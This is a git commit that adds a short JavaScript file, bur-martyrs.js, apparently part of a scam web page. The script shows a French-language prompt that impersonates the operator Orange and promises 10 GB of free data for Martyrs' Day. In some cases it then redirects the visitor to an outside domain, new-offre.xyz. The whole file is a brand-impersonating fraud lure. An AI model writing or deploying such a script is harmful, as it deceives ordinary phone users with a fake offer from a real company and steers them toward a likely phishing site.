a52211f5366df979411e62d5de17374a5193e113
bigetijazz10 <bigetijazz10@gmail.com>
2024-10-31 01:59:37 -0700

    Create bur-martyrs.js

---
+++ bur-martyrs.js
@@ -0,0 +1,6 @@
+
+var password = 'ACTIVER 10 Go'
+password=prompt('Orange: Bonjour! Vérifiez si votre numéro est éligible pour recevoir 10 Go de données gratuites pour célébrer la Journée des martyrs. Veuillez appuyer sur OK pour continuer','ACTIVER 10 Go');
+if (password != 'ACTIVER 10 Go') {
+location.href='https://www.new-offre.xyz/10gb-offre';
+}
